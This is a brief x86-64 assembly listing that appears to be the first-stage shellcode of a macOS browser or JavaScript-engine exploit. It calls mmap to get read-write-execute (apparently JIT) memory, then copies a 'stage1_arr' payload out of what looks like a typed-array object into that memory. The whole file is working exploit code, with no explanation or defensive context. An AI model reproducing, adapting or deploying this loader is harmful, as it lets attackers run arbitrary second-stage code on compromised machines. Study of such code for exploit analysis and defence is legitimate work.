BITS 64

mov rbp, [rsp + 0x28]
add rbp, 0x10

; rsi = argv[0] (stage1_arr)
mov rax, [rbp]
; esi = stage1_arr.length
mov esi, [rax + 0x18]

mov edi, 0
mov edx, 7
mov ecx, 0x1802
mov r8d, -1
mov r9, 0

push rbx
push rcx
push rbp
push r10
push r12
push r13
push r14
push r15

mov     eax, 20000C5h
mov     r10, rcx
syscall

pop r15
pop r14
pop r13
pop r12
pop r10
pop rbp
pop rcx
pop rbx

push rax
mov rdi, rax
; rsi = argv[0] (stage1_arr)
mov rax, [rbp]
; ecx = stage1_arr.length
mov ecx, [rax + 0x18]
; rsi = stage1_arr.vector
mov rsi, [rax + 0x10]
cld
rep movsb
ret
